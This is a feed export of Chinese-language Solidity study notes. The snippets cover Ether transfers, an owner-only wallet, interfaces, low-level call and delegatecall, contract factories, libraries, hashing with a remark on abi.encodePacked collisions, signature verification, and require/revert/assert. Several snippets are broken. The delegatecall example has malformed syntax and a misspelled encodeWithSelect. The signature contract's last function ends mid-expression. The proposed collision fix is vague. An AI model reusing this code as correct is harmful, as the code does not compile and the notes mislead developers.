class="line">contract SendEther&#123;</span><br><span class="line">    constructor()payable&#123;&#125;</span><br><span class="line">    receive()external payable&#123;&#125;</span><br><span class="line">    function <span class="title function_">sendtrsndfer</span><span class="params">(address payable _to)</span>external payable&#123;</span><br><span class="line">        _to.transfer(<span class="number">123</span>);<span class="comment">//代表123wei</span></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">sendsend</span><span class="params">(address payable _to)</span>external payable&#123;</span><br><span class="line">        <span class="type">bool</span> send=_to.send(<span class="number">123</span>);</span><br><span class="line">        require(send,<span class="string">&quot;send failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">sendcall</span><span class="params">(address payable _to)</span>external payable&#123;</span><br><span class="line">        (<span class="type">bool</span> success,)=_to.call&#123;value:<span class="number">123</span>&#125;(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        require(success,<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="制作一个以太坊钱包"><a href="#制作一个以太坊钱包" class="headerlink" title="制作一个以太坊钱包"></a>制作一个以太坊钱包</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract EtherWallet&#123;</span><br><span class="line">    address payable public  owner;</span><br><span class="line">    constructor()&#123;</span><br><span class="line">        owner=payable(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">    receive()external payable&#123;&#125;</span><br><span class="line">    function <span class="title function_">withdraw</span><span class="params">(uint _amount)</span>external&#123;</span><br><span class="line">        require(msg.sender==owner,<span class="string">&quot;caller is not owner&quot;</span>);</span><br><span class="line">        owner.transfer(_amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="通过一个合约地址调用另一个合约"><a href="#通过一个合约地址调用另一个合约" class="headerlink" title="通过一个合约地址调用另一个合约"></a>通过一个合约地址调用另一个合约</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">contract callTestContract&#123;</span><br><span class="line">    function <span class="title function_">setx1</span><span class="params">(address _test,uint _x)</span>external&#123;</span><br><span class="line">        TestContract(_test).setx(_x);</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">setx2</span><span class="params">(TestContract _test,uint _x)</span>external&#123;</span><br><span class="line">        _test.setx(_x);<span class="comment">//两种方法都可以</span></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">getx</span><span class="params">(address _test)</span>external view <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> TestContract(_test).getx();</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">setxandReceiveEther</span><span class="params">(address _test,uint _x)</span>external payable&#123;</span><br><span class="line">        TestContract(_test).setxandReceiveEther&#123;value:msg.value&#125;(_x);<span class="comment">//传入value的值</span></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">getxandValue</span><span class="params">(address _test)</span>external view <span class="title function_">returns</span><span class="params">(uint x,uint value)</span>&#123;</span><br><span class="line">        (x,value)=TestContract(_test).getxandValue();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract TestContract&#123;</span><br><span class="line">    uint public x;</span><br><span class="line">    uint public value=<span class="number">123</span>;</span><br><span class="line">    function <span class="title function_">setx</span><span class="params">(uint _x)</span>external&#123;</span><br><span class="line">        x=_x;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">getx</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">setxandReceiveEther</span><span class="params">(uint _x)</span>external payable&#123;</span><br><span class="line">        x=_x;</span><br><span class="line">        value=msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">getxandValue</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint, uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (x,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><p>当不知到一个合约源代码时可以用接口合约调用其中的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">interface ICounter&#123;</span><br><span class="line">    function <span class="title function_">count</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint)</span>;</span><br><span class="line">    function <span class="title function_">inc</span><span class="params">()</span>external;</span><br><span class="line">&#125;</span><br><span class="line">contract CallInterface&#123;</span><br><span class="line">    uint public count;</span><br><span class="line">    function <span class="title function_">examples</span><span class="params">(address _counter)</span>external&#123;</span><br><span class="line">        ICounter(_counter).inc();</span><br><span class="line">        count=ICounter(_counter).count();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//假如不知道Counter合约的源代码</span></span><br><span class="line">contract Counter&#123;</span><br><span class="line">    uint public count;</span><br><span class="line">    function <span class="title function_">inc</span><span class="params">()</span>external&#123;</span><br><span class="line">        count+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">dec</span><span class="params">()</span>external&#123;</span><br><span class="line">        count -=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="低级调用call-函数签名"><a href="#低级调用call-函数签名" class="headerlink" title="低级调用call(函数签名)"></a>低级调用call(函数签名)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">contract TestCall&#123;</span><br><span class="line">    <span class="built_in">string</span> public message;</span><br><span class="line">    uint public x;</span><br><span class="line">    event <span class="title function_">Log</span><span class="params">(<span class="built_in">string</span> message)</span>;</span><br><span class="line">    fallback()external payable&#123;</span><br><span class="line">        emit <span class="title function_">Log</span><span class="params">(<span class="string">&quot;fallback was called&quot;</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">foo</span><span class="params">(<span class="built_in">string</span> memory _message,uint _x)</span>external payable <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>,uint)</span>&#123;</span><br><span class="line">        message=_message;</span><br><span class="line">        x=_x;</span><br><span class="line">        <span class="keyword">return</span>(<span class="literal">true</span>,<span class="number">999</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Call&#123;<span class="comment">//用call调用合约中的函数</span></span><br><span class="line">    bytes public data;</span><br><span class="line">    function <span class="title function_">callFoo</span><span class="params">(address _test)</span>external payable&#123;</span><br><span class="line">        (<span class="type">bool</span> success,bytes memory _data)=_test.call&#123;value:<span class="number">111</span>&#125;(abi.encodeWithSignature(</span><br><span class="line">            <span class="string">&quot;foo(string,uint256)&quot;</span>,<span class="string">&quot;call foo&quot;</span>,<span class="number">123</span><span class="comment">//需要调用时转钱就加&#123;value:111&#125;(其中可规定gas用量)，否则不加</span></span><br><span class="line">        ));</span><br><span class="line">        require(success,<span class="string">&quot;call failed&quot;</span>);</span><br><span class="line">        data=_data;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">callNO</span><span class="params">(address _test)</span>external&#123;</span><br><span class="line">        (<span class="type">bool</span> success,)= _test.call(abi.encodeWithSignature(</span><br><span class="line">            <span class="string">&quot;doesnotexist()&quot;</span></span><br><span class="line">        ));</span><br><span class="line">        require(success,<span class="string">&quot;call failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="委托调用"><a href="#委托调用" class="headerlink" title="委托调用"></a>委托调用</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1.直接调用发生的变化</span></span><br><span class="line"><span class="comment">A calls B,sends 100 wei </span></span><br><span class="line"><span class="comment">        B calls C,sends 50wei</span></span><br><span class="line"><span class="comment">A ---&gt;B ---&gt;C</span></span><br><span class="line"><span class="comment">            msg.sender=B</span></span><br><span class="line"><span class="comment">            msg.value=50</span></span><br><span class="line"><span class="comment">            execute code on C state variables</span></span><br><span class="line"><span class="comment">            use ETH in C</span></span><br><span class="line"><span class="comment">2.委托调用发生的变化</span></span><br><span class="line"><span class="comment">A calls B,sends 100 wei</span></span><br><span class="line"><span class="comment">        Bdelegatecall C</span></span><br><span class="line"><span class="comment">A---&gt;B---&gt;C</span></span><br><span class="line"><span class="comment">            msg.sender=A</span></span><br><span class="line"><span class="comment">            msg.value=100</span></span><br><span class="line"><span class="comment">            execute code on B state variables</span></span><br><span class="line"><span class="comment">            use ETH in B</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">contract TestDelegatecall&#123;<span class="comment">//测试合约</span></span><br><span class="line">    uint public num;</span><br><span class="line">    address public sender;</span><br><span class="line">    uint public value;</span><br><span class="line">    function <span class="title function_">setVars</span><span class="params">(uint _num)</span>external payable&#123;</span><br><span class="line">        num=_num;</span><br><span class="line">        sender=msg.sender;</span><br><span class="line">        value=msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//委托调用合约,只改变委托合约的变量，不改变测试合约变量，通过测试合约改变了委托合约中的状态变量</span></span><br><span class="line">contract DelegateCall&#123;</span><br><span class="line">    uint public num;</span><br><span class="line">    address public sender;</span><br><span class="line">    uint public value;</span><br><span class="line">    function <span class="title function_">setVars</span><span class="params">(address _test,uint _num)</span>external payable&#123;</span><br><span class="line">        <span class="comment">// _test.delegatecall(</span></span><br><span class="line">        <span class="comment">//     abi.encodeWithSignature(&quot;setVars(uint256)&quot;,_num)</span></span><br><span class="line">        <span class="comment">//     );</span></span><br><span class="line">        _test.delegatecall(</span><br><span class="line">           (<span class="type">bool</span> success ,bytes memory data)= abi.encodeWithSelect(TestDelegatecall.setVars.selector ,_num)</span><br><span class="line">        );</span><br><span class="line">        require(success.<span class="string">&quot;delegatecall failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="用new来创建合约"><a href="#用new来创建合约" class="headerlink" title="用new来创建合约"></a>用new来创建合约</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">contract Account&#123;</span><br><span class="line">    address public bank;</span><br><span class="line">    address public owner;</span><br><span class="line">    constructor(address _owner)payable&#123;</span><br><span class="line">        bank=msg.sender;</span><br><span class="line">        owner=_owner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract AccountFactory&#123;</span><br><span class="line">    Account[]public accounts;</span><br><span class="line">    function <span class="title function_">createAccount</span><span class="params">(address _owner)</span>external payable&#123;</span><br><span class="line">        Account account=new Account&#123;value:<span class="number">111</span>&#125;(_owner);<span class="comment">//创建合约</span></span><br><span class="line">        accounts.push(account);<span class="comment">//将合约添入数组</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="库合约-library"><a href="#库合约-library" class="headerlink" title="库合约(library)"></a>库合约(library)</h2><p><strong>库合约就是自定义函数用来防止重复代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">library Math&#123;</span><br><span class="line">    function <span class="title function_">max</span><span class="params">(uint x,uint y)</span>internal pure <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x&gt;=y?x:y;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">find</span><span class="params">(uint []storage arr,uint x)</span>internal view <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(uint i=<span class="number">0</span>;i&lt;arr.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(arr[i]==x)&#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        revert(<span class="string">&quot;not found&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Test&#123;</span><br><span class="line">    function <span class="title function_">testMax</span><span class="params">(uint x,uint y)</span>external pure <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Math.max(x,y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract TestArray&#123;</span><br><span class="line">    using Math <span class="keyword">for</span> uint[];<span class="comment">//相当于我们把库运用到数组这个类型</span></span><br><span class="line">                           <span class="comment">//这个类型就拥有了这个库的所有函数的功能</span></span><br><span class="line">    uint []public arr=[<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>];</span><br><span class="line">    function <span class="title function_">testFind</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint i)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Math.find(arr,<span class="number">2</span>);<span class="comment">//没有用using的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="哈希算法"><a href="#哈希算法" class="headerlink" title="哈希算法"></a>哈希算法</h2><p><strong>用于签名获取特定的id</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">contract HashFunc&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    function <span class="title function_">encode</span><span class="params">(<span class="built_in">string</span> memory text0,<span class="built_in">string</span> memory text1)</span>external pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> abi.encode(text0,text1);<span class="comment">//返回值会补充0</span></span><br><span class="line">    &#125;</span><br><span class="line">     function <span class="title function_">encodePacked</span><span class="params">(<span class="built_in">string</span> memory text0,<span class="built_in">string</span> memory text1)</span>external pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> abi.encodePacked(text0,text1);<span class="comment">//不会补充零，造成漏洞 &quot;AAA&quot;&quot;BB&quot;的返回值与&quot;AA&quot;&quot;ABB&quot;一模一样</span></span><br><span class="line">    &#125;                                       <span class="comment">//AAA BB表示是传入的text0与text1</span></span><br><span class="line">    function <span class="title function_">hash</span><span class="params">(<span class="built_in">string</span> memory text,uint num,address addr)</span>external pure <span class="title function_">returns</span><span class="params">(bytes32)</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> keccak256(abi.encodePacked(text,num,addr));<span class="comment">//encodePacked这种会造成哈希碰撞</span></span><br><span class="line">                                                        <span class="comment">//就是打包之后&quot;AAA&quot;&quot;BB&quot;的哈希与&quot;AA&quot;&quot;ABB&quot;一样</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//encodePacked漏洞解决：在两个text之间uint一个数，这样就解决了</span></span><br></pre></td></tr></table></figure><h2 id="在智能合约中验证签名"><a href="#在智能合约中验证签名" class="headerlink" title="在智能合约中验证签名"></a>在智能合约中验证签名</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">四步骤:</span></span><br><span class="line"><span class="comment">1.message to sign</span></span><br><span class="line"><span class="comment">2.hash(message)</span></span><br><span class="line"><span class="comment">3.sign(hash(message),private key) | offchain(链下完成)</span></span><br><span class="line"><span class="comment">4.ecrecover(hash(message),signature)==signer  恢复签名，得出签名人的地址</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">contract VerifySig&#123;<span class="comment">//签名的验证</span></span><br><span class="line">    function <span class="title function_">verify</span><span class="params">(address _signer,<span class="built_in">string</span> memory _message,bytes memory _sig)</span></span><br><span class="line">        external pure <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>  <span class="comment">//_sig 签名结果</span></span><br><span class="line">    &#123;</span><br><span class="line">        bytes32 messageHash=getMessageHash(_message);</span><br><span class="line">        bytes32 ethSignedMessageHash=getEthSignedMessageHash(messageHash);</span><br><span class="line">        <span class="keyword">return</span> recover(ethSignedMessageHash,_sig)==_signer;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">getMessageHash</span><span class="params">(<span class="built_in">string</span> memory _message)</span>public pure <span class="title function_">returns</span><span class="params">(bytes32)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> keccak256(abi.encodePacked(_message));<span class="comment">//第一次加密</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">getEthSignedMessageHash</span><span class="params">(bytes32 _messageHash)</span>public pure <span class="title function_">returns</span><span class="params">(bytes32)</span>&#123;<span class="comment">//第二次加密</span></span><br><span class="line">        <span class="keyword">return</span> keccak256(abi.encodePacked(<span class="string">&quot;\x19Ethereum Signed Message:\n32&quot;</span>,_messageHash));<span class="comment">//两次哈希且增加字符串更安全</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     function <span class="title function_">toEthSignedMessageHash</span><span class="params">(bytes memory s)</span> internal pure <span class="title function_">returns</span> <span class="params">(bytes32)</span> &#123;</span><br><span class="line">         <span class="keyword">return</span> keccak256(abi.encodePacked(<span class="string">&quot;\x19Ethereum Signed Message:\n&quot;</span>, toString(s.length), s));</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">toTypedDataHash</span><span class="params">(bytes32 domainSeparator, bytes32 structHash)</span> internal pure <span class="title function_">returns</span> <span class="params">(bytes32)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> keccak256(abi.encodePacked(<span class="string">&quot;\x19\x01&quot;</span>, domainSeparator, structHash));</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">recover</span><span class="params">(bytes32 _ethSignedMessageHash,bytes memory _sig)</span></span><br><span class="line">        public pure <span class="title function_">returns</span><span class="params">(address)</span></span><br><span class="line">        &#123;<span class="comment">//得到签名人地址</span></span><br><span class="line">            (bytes32 r,bytes32 s,uint8 v)=_split(_sig);</span><br><span class="line">           <span class="keyword">return</span> ecrecover(_ethSignedMessageHash,v,r,s);</span><br><span class="line">        &#125;</span><br><span class="line">        function _split(bytes memory _sig)internal pure<span class="comment">//分割</span></span><br><span class="line">            returns(bytes32 r,bytes32 s,uint8 v)<span class="comment">//32+32+1=65位的长度</span></span><br><span class="line">        &#123;<span class="comment">//将加密信息分割成r s v</span></span><br><span class="line">           require(_sig.length==<span class="number">65</span>,<span class="string">&quot;invalid length&quot;</span>);</span><br><span class="line">           assembly &#123;<span class="comment">//用内联汇编进行分割_sig（只能）</span></span><br><span class="line">                r:=mload(add(_sig,<span class="number">32</span>))</span><br><span class="line">                s:=mload(add(_sig,<span class="number">64</span>))</span><br><span class="line">                v:=byte(<span class="number">0</span>,mload(add(_sig,<span class="number">96</span>)))</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    function toString(uint256 value) internal pure returns (<span class="built_in">string</span> memory) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (value == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        uint256 temp = value;</span><br><span class="line">        uint256 digits;</span><br><span class="line">        <span class="keyword">while</span> (temp != <span class="number">0</span>) &#123;</span><br><span class="line">            digits++;</span><br><span class="line">            temp /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        bytes memory buffer = new bytes(digits);</span><br><span class="line">        <span class="keyword">while</span> (value != <span class="number">0</span>) &#123;</span><br><span class="line">            digits -= <span class="number">1</span>;</span><br><span class="line">            buffer[digits] = bytes1(uint8(<span class="number">48</span> + uint256(value % <span class="number">10</span>)));</span><br><span class="line">            value /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">string</span>(buffer);&#125;</span><br><span class="line">    </span><br><span class="line">    function <span class="title function_">get</span><span class="params">(<span class="built_in">string</span> memory _message)</span>public pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;</span><br><span class="line">        <span class="comment">//return keccak256(abi.encodePacked(_message));//第一次加密</span></span><br><span class="line">        <span class="keyword">return</span> abi.encodePacked(_message);</span><br><span class="line">        <span class="keyword">return</span> keccak256(abi.)</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -solidity学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>solidity基础知识点（一）</title>
      <link href="/2022/10/28/solidity/%E6%9D%82%E4%B9%B1/%EF%BC%88%E4%B8%80%EF%BC%89solidity%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2022/10/28/solidity/%E6%9D%82%E4%B9%B1/%EF%BC%88%E4%B8%80%EF%BC%89solidity%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="solidity-基础知识（一）"><a href="#solidity-基础知识（一）" class="headerlink" title="solidity 基础知识（一）"></a>solidity 基础知识（一）</h1><h2 id="报错控制的相关知识点"><a href="#报错控制的相关知识点" class="headerlink" title="报错控制的相关知识点"></a>报错控制的相关知识点</h2><p>用于检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">contract error&#123;<span class="comment">//报错控制</span></span><br><span class="line">    function <span class="title function_">testrequire</span><span class="params">(uint i)</span>public pure&#123;</span><br><span class="line">        require(i&lt;=<span class="number">10</span>,<span class="string">&quot;i&gt;10&quot;</span>);<span class="comment">//不满足则报错字符串内容</span></span><br><span class="line">    &#125;<span class="comment">//gas费与字符长度有关，报错之后会回滚到报错前的状态</span></span><br><span class="line"></span><br><span class="line">    function <span class="title function_">testrevert</span><span class="params">(uint i)</span>public pure&#123;</span><br><span class="line">        <span class="keyword">if</span>(i&gt;<span class="number">10</span>)&#123;</span><br><span class="line">            revert(<span class="string">&quot;i&gt;10&quot;</span>);</span><br><span class="line">        &#125;&#125;</span><br><span class="line">        uint public num=<span class="number">123</span>;</span><br><span class="line">        function <span class="title function_">testassert</span><span class="params">()</span>public view&#123;</span><br><span class="line">            assert(num==<span class="number">123</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        function <span class="title function_">foo</span><span class="params">()</span>public&#123;</span><br><span class="line">            num+=<span class="number">1</span>;</span><br><span class="line">        &#125;<span class="comment">//num加1之后就不满足testassert函数，再调用testassert就会报错</span></span><br><span class="line">        error <span class="title function_">Myerror</span><span class="params">(address caller,uint i)</span>;<span class="comment">//自定义错误来节约gas</span></span><br><span class="line">        function <span class="title function_">testcustom</span><span class="params">(uint i)</span>public view&#123;</span><br><span class="line">            <span class="keyword">if</span>(i&gt;<span class="number">10</span>)&#123;</span><br><span class="line">                revert <span class="title function_">Myerror</span><span class="params">(msg.sender,i)</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 